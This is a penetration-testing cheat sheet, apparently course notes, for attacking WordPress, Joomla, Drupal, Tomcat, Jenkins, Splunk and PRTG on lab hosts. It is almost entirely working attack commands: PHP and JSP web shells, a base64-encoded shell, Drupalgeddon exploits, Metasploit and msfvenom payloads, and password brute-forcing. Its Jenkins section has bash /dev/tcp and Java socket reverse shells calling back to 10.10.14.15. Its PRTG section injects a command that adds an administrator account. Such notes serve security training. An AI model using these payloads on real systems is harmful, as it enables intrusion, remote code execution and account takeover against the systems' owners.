# Attacking Common Applications

### Enumeration

```shell

nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
sudo nmap --open -sV 10.129.201.50

sudo apt-get install eyewitness
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness

wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip
echo $PATH
cat web_discovery.xml | ./aquatone -nmap
```

---

### WordPress

```shell
/wp-admin, /wp-content
curl -s http://blog.inlanefreight.local | grep WordPress
curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
curl -s http://blog.inlanefreight.local/ | grep themes

sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

#add to a theme/template so a site
system($_GET[0]);
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

use exploit/unix/webapp/wp_admin_shell_upload

python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```

---

### Joomla

```shell
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
curl -s http://dev.inlanefreight.local/ | grep Joomla
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -

sudo pip3 install droopescan
droopescan scan joomla --url http://dev.inlanefreight.local/

python2.7 joomlascan.py -u http://dev.inlanefreight.local

sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

# add to a template or site or configuration we can hit
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```

---

### Drupal

```shell
curl -s http://drupal.inlanefreight.local | grep Drupal
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt

droopescan scan drupal -u http://drupal.inlanefreight.local

# put this on a page or as a page and also disable php filter
<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>

curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"

wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/

# then install these as a new module  (/admin/modules/install)
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

python2.7 drupalgeddon.py
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

# another exploit
python3 drupalgeddon2.py 
curl -s http://drupal-dev.inlanefreight.local/hello.txt
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
python3 drupalgeddon2.py 
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id

# another
use multi/http/drupal_drupageddon3
```

---

### Tomcat

```shell
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt

use scanner/http/tomcat_mgr_login

#to run throguh burp
set PROXIES HTTP:127.0.0.1:8080

echo YWRtaW46dmFncmFudA== |base64 -d

# Tomcat manager file upload vulnerability waf file 
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp

curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

nmap -sV -p 8009,8080 app-dev.inlanefreight.local
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml

```

---

### Jenkins

```shell
#using the scripts tab
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

nc -lvnp 8443

String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

### Splunk

```shell
sudo nmap -sV 10.129.201.50

git clone https://github.com/0xjpuff/reverse_shell_splunk.git
#edit bin/run.ps1
tar -cvzf updater.tar.gz reverse_shell_splunk/
# upload it to the manager/search/app/local

nc -lvnp <port>
```

---

### PRTG

```shell
# default credentials: prtgadmin:Password123
sudo nmap -sV -p- --open -T4 10.129.201.50
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version

# go to setup/account settings/notifications add a new notification then execute program
Demo exe notification - outfile.ps1
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add # add this as parameter
# thenn send test notification

sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```
